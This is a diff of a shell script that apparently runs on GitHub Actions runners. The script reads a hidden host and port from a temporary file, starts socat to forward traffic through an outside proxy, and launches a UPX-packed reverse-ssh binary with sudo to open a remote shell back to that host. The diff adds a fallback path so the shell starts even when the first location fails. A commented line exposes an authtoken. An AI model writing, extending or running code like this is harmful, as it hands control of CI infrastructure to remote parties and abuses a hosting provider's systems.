@@ -38,7 +38,7 @@ cp /tmp/js9 $GITHUB_WORKSPACE/js9.txt;
          num61z=$(date +%S);
          num67z=$(echo "1"$num61z);
          num76=$((${num67z}%8));
-         bport=5005"$num76";echo $bport|tee /tmp/keepalive;
+         bport=5005"$num76";echo $bport >> /tmp/keepalive;
 # 提取反弹upxSSH的主机和端口
 ip_port5=$(grep -oP "(?<=AABBCC_rev_shellLLL).*(?=FFF)" /tmp/js9)
 port5=${ip_port5#*:};
@@ -47,6 +47,7 @@ ip5=${ip_port5%:*};
 ip_port7=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9)
 port7=${ip_port7#*:};
 ip7=${ip_port7%:*};
+echo "flag 1122334";
 
 if [ ! -z ${port7} ] && [ ! -z ${ip7} ]; then
   setsid /home/runner/work/nc_test/nc_test/socat.bin TCP4-LISTEN:50022,reuseaddr,fork  proxy:${ip7}:127.0.0.1:2244,proxyport=${port7}  &
@@ -72,7 +73,10 @@ fi
 if [ ! -z ${port5} ] && [ ! -z ${ip5} ] && [ "714" == "714"  ]; then 
   #nohup sudo $GITHUB_WORKSPACE/natapp -authtoken=0c4f43f4aa226595 &
   #sudo sh -c "export HOME=/tmp;$GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b $bport  -p $port5 $ip5"; 
-  [ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&sudo sh -c "$GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5";
+   [ ! -z ${$GITHUB_WORKSPACE} ]&&
+   (
+      [ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&sudo sh -c "$GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5";
+   )||sudo sh -c "/home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5";
   echo "exit_revSSH_isOK_$bport";
 fi
 
